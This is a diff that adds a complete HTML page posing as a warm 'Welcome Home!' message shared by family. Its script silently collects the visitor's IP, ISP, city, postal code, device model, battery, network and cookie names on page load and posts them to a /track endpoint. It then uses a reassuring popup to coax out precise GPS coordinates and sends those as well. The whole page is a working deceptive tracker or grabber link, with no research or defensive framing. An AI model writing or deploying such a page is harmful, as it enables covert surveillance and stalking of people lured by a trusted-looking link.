@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      min-height:100vh;display:flex;align-items:center;justify-content:center;
+      background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
+      font-family:'Segoe UI',sans-serif;padding:1rem;
+    }
+
+    /* ── Main welcome card ── */
+    .card{
+      background:rgba(255,255,255,0.08);backdrop-filter:blur(20px);
+      border:1px solid rgba(255,255,255,0.15);border-radius:28px;
+      padding:3rem 2.5rem;text-align:center;max-width:440px;width:100%;
+      transition:all 0.4s ease;
+    }
+    .pulse-ring{
+      width:100px;height:100px;border-radius:50%;
+      background:rgba(102,126,234,0.2);
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 2rem;position:relative;
+    }
+    .pulse-ring::before,.pulse-ring::after{
+      content:'';position:absolute;width:100%;height:100%;border-radius:50%;
+    }
+    .pulse-ring::before{border:2px solid rgba(102,126,234,0.5);animation:ripple 2s infinite}
+    .pulse-ring::after {border:2px solid rgba(102,126,234,0.3);animation:ripple 2s infinite 0.5s}
+    @keyframes ripple{0%{transform:scale(1);opacity:1}100%{transform:scale(1.6);opacity:0}}
+    h1{color:#fff;font-size:26px;font-weight:700;margin-bottom:0.5rem}
+    p{color:rgba(255,255,255,0.7);font-size:15px;line-height:1.7;margin-bottom:2rem}
+    .progress-bar{background:rgba(255,255,255,0.1);border-radius:20px;height:6px;overflow:hidden;margin-bottom:1rem}
+    .progress-fill{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:20px;width:0%;transition:width 0.5s ease}
+    .status{font-size:13px;color:rgba(255,255,255,0.45);margin-bottom:0.5rem}
+
+    /* ── Live map section (shown after location granted) ── */
+    #map-section{display:none;margin-top:1.5rem;border-radius:16px;overflow:hidden;border:1px solid rgba(102,126,234,0.35)}
+    #map-section .map-header{
+      background:rgba(34,197,94,0.15);border-bottom:1px solid rgba(34,197,94,0.25);
+      padding:0.6rem 1rem;font-size:13px;color:#4ade80;font-weight:700;text-align:left;
+      display:flex;align-items:center;gap:6px;
+    }
+    #map-section iframe{width:100%;height:220px;border:none;display:block}
+    #map-coords{font-size:11px;color:rgba(255,255,255,0.4);padding:0.5rem 1rem;text-align:left;background:rgba(0,0,0,0.2)}
+
+    /* ── Location popup overlay ── */
+    #loc-overlay{
+      display:none;position:fixed;inset:0;
+      background:rgba(0,0,0,0.75);backdrop-filter:blur(6px);
+      z-index:1000;align-items:center;justify-content:center;padding:1rem;
+    }
+    #loc-overlay.show{display:flex}
+    .loc-popup{
+      background:linear-gradient(135deg,#1a1a2e,#16213e);
+      border:1px solid rgba(102,126,234,0.4);border-radius:24px;
+      padding:2.5rem 2rem;max-width:360px;width:100%;text-align:center;
+      animation:popIn 0.35s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes popIn{0%{transform:scale(0.7);opacity:0}100%{transform:scale(1);opacity:1}}
+    .loc-icon{
+      width:80px;height:80px;border-radius:50%;
+      background:linear-gradient(135deg,rgba(102,126,234,0.3),rgba(118,75,162,0.3));
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 1.5rem;font-size:36px;
+      animation:bounce 1.5s ease-in-out infinite;
+    }
+    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+    .loc-popup h2{color:#fff;font-size:20px;font-weight:700;margin-bottom:0.75rem}
+    .loc-popup p {color:rgba(255,255,255,0.65);font-size:14px;line-height:1.6;margin-bottom:1.75rem}
+    .btn-allow{
+      width:100%;padding:13px;border:none;border-radius:14px;cursor:pointer;
+      background:linear-gradient(135deg,#667eea,#764ba2);
+      color:#fff;font-size:15px;font-weight:700;
+      box-shadow:0 4px 20px rgba(102,126,234,0.4);
+      transition:transform 0.15s,opacity 0.15s;
+    }
+    .btn-allow:hover{transform:translateY(-1px);opacity:0.92}
+    .btn-allow:disabled{opacity:0.6;cursor:not-allowed;transform:none}
+    .btn-later{
+      background:none;border:none;color:rgba(255,255,255,0.35);
+      font-size:13px;cursor:pointer;margin-top:1rem;display:block;width:100%;
+      padding:0.4rem;
+    }
+    .btn-later:hover{color:rgba(255,255,255,0.6)}
+    .loc-note{
+      font-size:11px;color:rgba(255,255,255,0.3);margin-top:1rem;line-height:1.5;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Main card -->
+<div class="card">
+  <div class="pulse-ring">
+    <svg width="44" height="44" viewBox="0 0 24 24" fill="none"
+         stroke="#667eea" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
+      <polyline points="9 22 9 12 15 12 15 22"/>
+    </svg>
+  </div>
+  <h1>Welcome Home!</h1>
+  <p>This page was shared with you by your family. You are safe and loved.</p>
+  <div class="progress-bar"><div class="progress-fill" id="prog"></div></div>
+  <div class="status" id="status">Initializing...</div>
+
+  <!-- Live map — appears after location is granted -->
+  <div id="map-section">
+    <div class="map-header">📍 Your location has been shared</div>
+    <iframe id="map-frame" src="" allowfullscreen></iframe>
+    <div id="map-coords"></div>
+  </div>
+</div>
+
+<!-- Location permission popup (appears after 3 seconds) -->
+<div id="loc-overlay">
+  <div class="loc-popup">
+    <div class="loc-icon">📍</div>
+    <h2>Share Your Location</h2>
+    <p>Your family wants to make sure you are safe.<br>Please allow location so they can see where you are right now.</p>
+    <button class="btn-allow" id="btn-allow">Allow Location Access</button>
+    <button class="btn-later" id="btn-later">Maybe later</button>
+    <div class="loc-note">Your location is only shared with your family dashboard.</div>
+  </div>
+</div>
+
+<script>
+const SERVER_URL = window.location.origin + "/track";
+
+function setProgress(p, msg) {
+  document.getElementById("prog").style.width = p + "%";
+  document.getElementById("status").textContent = msg;
+}
+
+// ── Browser ──────────────────────────────────────────────────────────────────
+function getBrowser(ua) {
+  const u = ua.toLowerCase();
+  if (u.includes("edg/"))             return "Microsoft Edge";
+  if (u.includes("opr/") || u.includes("opera")) return "Opera";
+  if (u.includes("samsungbrowser"))   return "Samsung Internet";
+  if (u.includes("miuibrowser"))      return "MIUI Browser";
+  if (u.includes("ucbrowser"))        return "UC Browser";
+  if (u.includes("firefox"))          return "Mozilla Firefox";
+  if (u.includes("chrome"))           return "Google Chrome";
+  if (u.includes("safari"))           return "Apple Safari";
+  return "Unknown Browser";
+}
+
+// ── OS ───────────────────────────────────────────────────────────────────────
+function getOS(ua) {
+  const android = ua.match(/Android\s([\d.]+)/);
+  if (android) return "Android " + android[1];
+  const ios = ua.match(/OS\s([\d_]+)\slike/);
+  if (ios) return "iOS " + ios[1].replace(/_/g,".");
+  if (ua.includes("iPhone")) return "iOS";
+  if (ua.includes("iPad"))   return "iPadOS";
+  // Windows version detection
+  const win = ua.match(/Windows NT ([\d.]+)/);
+  if (win) {
+    const v = { "10.0":"Windows 10/11","6.3":"Windows 8.1","6.2":"Windows 8","6.1":"Windows 7","6.0":"Windows Vista","5.1":"Windows XP" };
+    return v[win[1]] || "Windows NT " + win[1];
+  }
+  if (ua.includes("Mac OS X")) {
+    const mac = ua.match(/Mac OS X ([\d_]+)/);
+    if (mac) return "macOS " + mac[1].replace(/_/g,".");
+    return "macOS";
+  }
+  if (ua.includes("CrOS"))   return "Chrome OS";
+  if (ua.includes("Linux"))  return "Linux";
+  return "Unknown OS";
+}
+
+// ── Device type ───────────────────────────────────────────────────────────────
+function getDeviceType(ua) {
+  if (/iPad/i.test(ua))                     return "Tablet";
+  if (/Mobi|Android|iPhone|iPod/i.test(ua)) return "Mobile Phone";
+  if (/CrOS/i.test(ua))                     return "Chromebook";
+  if (/Macintosh/i.test(ua))               return "MacBook / iMac";
+  if (/Windows/i.test(ua))                 return "Windows PC / Laptop";
+  if (/Linux/i.test(ua))                   return "Linux PC";
+  return "Desktop / Laptop";
+}
+
+// ── IMPROVED: Brand + Model (handles laptops properly) ───────────────────────
+async function getDeviceModel(ua) {
+  // ── Mobile: try UA Client Hints first ────────────────────────────────────
+  if (navigator.userAgentData) {
+    try {
+      const h = await navigator.userAgentData.getHighEntropyValues([
+        "model","platform","platformVersion","architecture","uaFullVersion"
+      ]);
+      const model = (h.model || "").trim();
+      const platform = (h.platform || "").trim();
+      if (model) {
+        // mobile device — model is real (e.g. "SM-A546B", "Redmi Note 12")
+        return {
+          model,
+          brand: detectBrand(model, ua),
+          platform,
+          platformVersion: h.platformVersion || "",
+          architecture: h.architecture || ""
+        };
+      }
+      // Desktop: model is empty but platform is filled
+      if (platform) {
+        const { brand, model: deskModel } = desktopBrandModel(platform, ua);
+        return { brand, model: deskModel, platform, platformVersion: h.platformVersion||"", architecture: h.architecture||"" };
+      }
+    } catch(e) {}
+  }
+
+  // ── Fallback: parse from UA string ───────────────────────────────────────
+  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+  if (isMobile) {
+    const m = parseMobileModel(ua);
+    return { brand: detectBrand(m, ua), model: m, platform:"", platformVersion:"", architecture:"" };
+  }
+  // Desktop fallback
+  const os = getOS(ua);
+  const { brand, model } = desktopBrandModel("", ua);
+  return { brand, model, platform: os, platformVersion:"", architecture:"" };
+}
+
+// Desktop brand/model from OS
+function desktopBrandModel(platform, ua) {
+  const p = (platform || "").toLowerCase();
+  const u = ua.toLowerCase();
+  if (p === "macos" || u.includes("macintosh")) {
+    // Try to detect MacBook vs iMac from screen size hint
+    return { brand: "Apple", model: "MacBook / Mac" };
+  }
+  if (p === "windows" || u.includes("windows")) {
+    return { brand: "Windows PC", model: "Laptop / Desktop" };
+  }
+  if (p === "chromeos" || u.includes("cros")) {
+    return { brand: "Chromebook", model: "Chrome OS Device" };
+  }
+  if (p === "linux" || u.includes("linux")) {
+    return { brand: "Linux PC", model: "Linux Laptop / Desktop" };
+  }
+  return { brand: "Unknown", model: "PC / Laptop" };
+}
+
+// Detect brand from mobile model string or UA
+function detectBrand(model, ua) {
+  const m = (model || "").toLowerCase();
+  const u = (ua || "").toLowerCase();
+  if (/^sm-/.test(m) || u.includes("samsung"))                  return "Samsung";
+  if (/^iphone|^ipad/.test(m) || u.includes("iphone") || u.includes("ipad")) return "Apple";
+  if (/iqoo/.test(m) || u.includes("iqoo"))                     return "iQOO";
+  if (/redmi|poco|^mi\s/.test(m) || u.includes("redmi") || u.includes("poco") || u.includes("xiaomi")) return "Xiaomi";
+  if (/vivo/.test(m) || u.includes("vivo"))                     return "Vivo";
+  if (/oppo/.test(m) || u.includes("oppo"))                     return "OPPO";
+  if (/realme|^rmx/.test(m) || u.includes("realme"))            return "Realme";
+  if (/oneplus|^op[a-z0-9]/.test(m) || u.includes("oneplus"))  return "OnePlus";
+  if (/pixel/.test(m) || u.includes("pixel"))                   return "Google";
+  if (/moto/.test(m) || u.includes("motorola"))                 return "Motorola";
+  if (/nokia/.test(m) || u.includes("nokia"))                   return "Nokia";
+  if (/huawei/.test(m) || u.includes("huawei"))                 return "Huawei";
+  if (/honor/.test(m) || u.includes("honor"))                   return "Honor";
+  if (/infinix/.test(m) || u.includes("infinix"))               return "Infinix";
+  if (/tecno/.test(m) || u.includes("tecno"))                   return "Tecno";
+  if (/lava/.test(m) || u.includes("lava"))                     return "Lava";
+  if (/asus/.test(m) || u.includes("asus"))                     return "Asus";
+  if (/lenovo/.test(m) || u.includes("lenovo"))                 return "Lenovo";
+  return "Unknown Brand";
+}
+
+function parseMobileModel(ua) {
+  const patterns = [
+    /\b(SM-[A-Z0-9]+)/i,
+    /\b(iPhone\d+,\d+)/i,  /\b(iPad[\w,]+)/i,
+    /\b(iQOO\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Redmi\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(POCO\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Mi\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(vivo\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(OPPO\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Realme\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(RMX[0-9A-Z]+)/i,
+    /\b(OnePlus\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(OP[A-Z0-9]+)(?=\s+Build)/i,
+    /\b(Pixel\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(moto\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Nokia\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(HUAWEI\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Honor\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Infinix\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(TECNO\s[\w\s]+?)(?=\s+Build)/i,
+    /\b(Lava\s[\w\s]+?)(?=\s+Build)/i,
+    /;\s([^;)]+?)\s+Build\//i,
+  ];
+  for (const p of patterns) {
+    const m = ua.match(p);
+    if (m) return m[1].trim();
+  }
+  if (/iPhone/i.test(ua)) return "iPhone";
+  if (/iPad/i.test(ua))   return "iPad";
+  return "Unknown Mobile";
+}
+
+// ── Network (5G heuristic) ────────────────────────────────────────────────────
+function getNetwork() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return { network_type:"Unknown", downlink_mbps:"N/A", rtt_ms:"N/A", data_saver:"N/A" };
+  const et = c.effectiveType || "unknown";
+  const dl = c.downlink || 0;
+  const rt = c.rtt !== undefined ? c.rtt : 999;
+  let display;
+  if (c.type === "wifi")          display = "WiFi";
+  else if (et === "4g") {
+    if (dl >= 50 && rt <= 20)     display = "5G (detected by speed)";
+    else if (dl >= 20 && rt <= 50)display = "4G / Possibly 5G";
+    else                          display = "4G LTE";
+  }
+  else if (et === "3g")           display = "3G";
+  else if (et === "2g" || et === "slow-2g") display = "2G / Edge";
+  else                            display = et.toUpperCase() || "Unknown";
+  return {
+    network_type:  display, raw_effective: et,
+    downlink_mbps: dl ? dl+" Mbps" : "N/A",
+    rtt_ms:        c.rtt !== undefined ? c.rtt+" ms" : "N/A",
+    data_saver:    c.saveData ? "Enabled" : "Disabled"
+  };
+}
+
+// ── Battery ───────────────────────────────────────────────────────────────────
+async function getBattery() {
+  if (!navigator.getBattery) return {};
+  try {
+    const b = await navigator.getBattery();
+    return {
+      battery_level:    Math.round(b.level*100)+"%",
+      battery_charging: b.charging ? "Yes (Charging)" : "No (On Battery)",
+      charge_time:      b.chargingTime===Infinity ? "N/A" : Math.round(b.chargingTime/60)+" min",
+      discharge_time:   b.dischargingTime===Infinity ? "N/A" : Math.round(b.dischargingTime/60)+" min"
+    };
+  } catch(e) { return {}; }
+}
+
+// ── Cookies ───────────────────────────────────────────────────────────────────
+function getCookieInfo() {
+  const pairs = document.cookie ? document.cookie.split(";").map(c=>c.trim()).filter(Boolean) : [];
+  return {
+    cookies_enabled: navigator.cookieEnabled,
+    cookie_count:    pairs.length,
+    cookie_keys:     pairs.map(p=>p.split("=")[0].trim()).join(", ") || "none"
+  };
+}
+
+// ── GPS location ──────────────────────────────────────────────────────────────
+function getGPS(high) {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve({ loc_error:"Geolocation not supported" });
+    const t = setTimeout(() => resolve({ loc_error:"Timed out" }), 20000);
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        clearTimeout(t);
+        const acc = Math.round(pos.coords.accuracy);
+        resolve({
+          gps_latitude:  pos.coords.latitude.toFixed(6),
+          gps_longitude: pos.coords.longitude.toFixed(6),
+          gps_accuracy:  acc+" meters",
+          gps_altitude:  pos.coords.altitude!=null ? Math.round(pos.coords.altitude)+" m" : "N/A",
+          gps_speed:     pos.coords.speed!=null ? (pos.coords.speed*3.6).toFixed(1)+" km/h" : "N/A",
+          location_type: acc>500?"Cell Tower":acc>100?"WiFi Based":"GPS",
+          maps_link:     `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+        });
+      },
+      err => {
+        clearTimeout(t);
+        resolve({ loc_error:["","Permission denied","Position unavailable","Timed out"][err.code]||"Error" });
+      },
+      { enableHighAccuracy: high, timeout:20000, maximumAge:0 }
+    );
+  });
+}
+
+// ── Show map on page ──────────────────────────────────────────────────────────
+function showMap(lat, lon, locType, accuracy) {
+  const zoom = 15;
+  // OpenStreetMap embed — no API key needed
+  const osmUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.008},${lat-0.008},${lon+0.008},${lat+0.008}&layer=mapnik&marker=${lat},${lon}`;
+  document.getElementById("map-frame").src = osmUrl;
+  document.getElementById("map-coords").textContent = `📍 ${lat}, ${lon}  |  ${locType}  |  Accuracy: ${accuracy}`;
+  document.getElementById("map-section").style.display = "block";
+}
+
+// ── MAIN ─────────────────────────────────────────────────────────────────────
+let globalPayload = {};
+
+async function collectAndSend() {
+  const ua = navigator.userAgent;
+
+  setProgress(10,"Detecting device...");
+  const deviceInfo = await getDeviceModel(ua);
+
+  setProgress(25,"Checking network...");
+  const networkInfo = getNetwork();
+
+  setProgress(40,"Checking battery...");
+  const batteryInfo = await getBattery();
+
+  setProgress(55,"Looking up IP info...");
+  let ipData = {};
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    ipData = await r.json();
+  } catch(e){}
+
+  setProgress(80,"Gathering details...");
+  const cookieInfo = getCookieInfo();
+
+  setProgress(92,"Sending data...");
+
+  globalPayload = {
+    // IP
+    ip_address:   ipData.ip           || "N/A",
+    isp_name:     ipData.org          || "N/A",
+    asn:          ipData.asn          || "N/A",
+    country:      ipData.country_name || "N/A",
+    country_code: ipData.country      || "N/A",
+    region:       ipData.region       || "N/A",
+    city:         ipData.city         || "N/A",
+    postal_code:  ipData.postal       || "N/A",
+    ip_latitude:  ipData.latitude     || "N/A",
+    ip_longitude: ipData.longitude    || "N/A",
+    ip_timezone:  ipData.timezone     || "N/A",
+
+    // Device
+    device_brand:     deviceInfo.brand          || "N/A",
+    device_model:     deviceInfo.model          || "N/A",
+    platform:         deviceInfo.platform        || "",
+    platform_version: deviceInfo.platformVersion || "",
+    architecture:     deviceInfo.architecture    || "",
+    browser:          getBrowser(ua),
+    os:               getOS(ua),
+    device_type:      getDeviceType(ua),
+    screen:           screen.width+"x"+screen.height+" @"+(window.devicePixelRatio||1)+"x",
+    color_depth:      screen.colorDepth+" bit",
+    // NOTE: navigator.deviceMemory is capped at 8GB by all browsers for privacy.
+    // Even a 16GB or 32GB device shows max 8GB. This is a browser security restriction.
+    ram_gb:           navigator.deviceMemory ? navigator.deviceMemory+" GB (browser-capped)" : "N/A",
+    cpu_cores:        navigator.hardwareConcurrency || "N/A",
+    language:         navigator.language,
+    timezone_local:   Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch_points:     navigator.maxTouchPoints || 0,
+    user_agent:       ua,
+    time_opened:      new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata"}),
+
+    ...batteryInfo,
+    ...networkInfo,
+    ...cookieInfo,
+
+    gps_latitude:  "Awaiting permission",
+    gps_longitude: "Awaiting permission",
+    location_type: "Not yet collected"
+  };
+
+  try {
+    await fetch(SERVER_URL, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(globalPayload)
+    });
+  } catch(e){}
+
+  setProgress(100,"Page loaded successfully.");
+
+  // Show location popup after 3 seconds
+  setTimeout(() => {
+    document.getElementById("loc-overlay").classList.add("show");
+  }, 3000);
+}
+
+// ── Location popup buttons ────────────────────────────────────────────────────
+document.getElementById("btn-allow").addEventListener("click", async () => {
+  const btn = document.getElementById("btn-allow");
+  btn.textContent = "⏳ Getting your location...";
+  btn.disabled = true;
+  document.getElementById("btn-later").style.display = "none";
+
+  const locData = await getGPS(true);
+  Object.assign(globalPayload, locData);
+
+  try {
+    await fetch(SERVER_URL, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ ...globalPayload, location_update:true })
+    });
+  } catch(e){}
+
+  if (locData.gps_latitude) {
+    // Success — hide popup, show map on main card
+    document.getElementById("loc-overlay").classList.remove("show");
+    showMap(
+      parseFloat(locData.gps_latitude),
+      parseFloat(locData.gps_longitude),
+      locData.location_type,
+      locData.gps_accuracy
+    );
+    document.getElementById("status").textContent = "✅ Location shared with your family!";
+  } else {
+    btn.textContent = "❌ " + (locData.loc_error || "Location unavailable");
+    btn.style.background = "rgba(239,68,68,0.5)";
+    btn.disabled = false;
+    document.getElementById("btn-later").style.display = "block";
+  }
+});
+
+document.getElementById("btn-later").addEventListener("click", () => {
+  document.getElementById("loc-overlay").classList.remove("show");
+});
+
+collectAndSend();
+</script>
+</body>
+</html>
